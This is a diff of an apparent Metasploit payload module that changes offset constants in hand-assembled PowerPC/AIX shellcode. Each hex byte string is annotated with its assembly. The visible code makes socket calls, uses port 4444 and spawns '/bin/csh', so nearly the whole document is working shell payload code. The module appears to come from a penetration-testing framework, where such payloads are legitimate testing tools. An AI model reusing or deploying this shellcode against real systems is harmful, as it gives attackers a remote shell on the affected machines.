@@ -56,15 +56,15 @@ module Metasploit3
 		"\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
 		"\x44\xff\xff\x02"     +#   svca    0                          #
 		"\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
-		"\x3b\xa0\x01\xff"     +#   lil     r29,511                    #
+		"\x3b\xa0\x07\xff"     +#   lil     r29,2047                   #
 		"\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
-		"\x38\x9d\xfe\x02"     +#   cal     r4,-510(r29)               #
-		"\x38\x7d\xfe\x03"     +#   cal     r3,-509(r29)               #
+		"\x38\x9d\xf8\x02"     +#   cal     r4,-2046(r29)              #
+		"\x38\x7d\xf8\x03"     +#   cal     r3,-2045(r29)              #
 		@cal_socket +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"\x7c\x7c\x1b\x78"     +#   mr      r28,r3                     #
-		"\x38\xbd\xfe\x11"     +#   cal     r5,-495(r29)               #
+		"\x38\xbd\xf8\x11"     +#   cal     r5,-2031(r29)              #
 		"\x3f\x60\xff\x02"     +#   liu     r27,-254                   #
 		"\x63\x7b\x11\x5c"     +#   oril    r27,r27,4444               #
 		"\x97\xe1\xff\xfc"     +#   stu     r31,-4(r1)                 #
@@ -85,7 +85,7 @@ module Metasploit3
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"\x7c\x7a\x1b\x78"     +#   mr      r26,r3                     #
-		"\x3b\x3d\xfe\x03"     +#   cal     r25,-509(r29)              #
+		"\x3b\x3d\xf8\x03"     +#   cal     r25,-2045(r29)             #
 		"\x7f\x23\xcb\x78"     +#   mr      r3,r25                     #
 		@cal_close +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
@@ -112,13 +112,14 @@ module Metasploit3
 		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"/bin/csh"
 
-      # If the payload is generated and there are offsets to substitute,
+		# If the payload is generated and there are offsets to substitute,
 		# do that now.
 		if (payload and offsets)
 			substitute_vars(payload, offsets)
 		end
 
-      payload
+		payload
 	end
 
 end
+
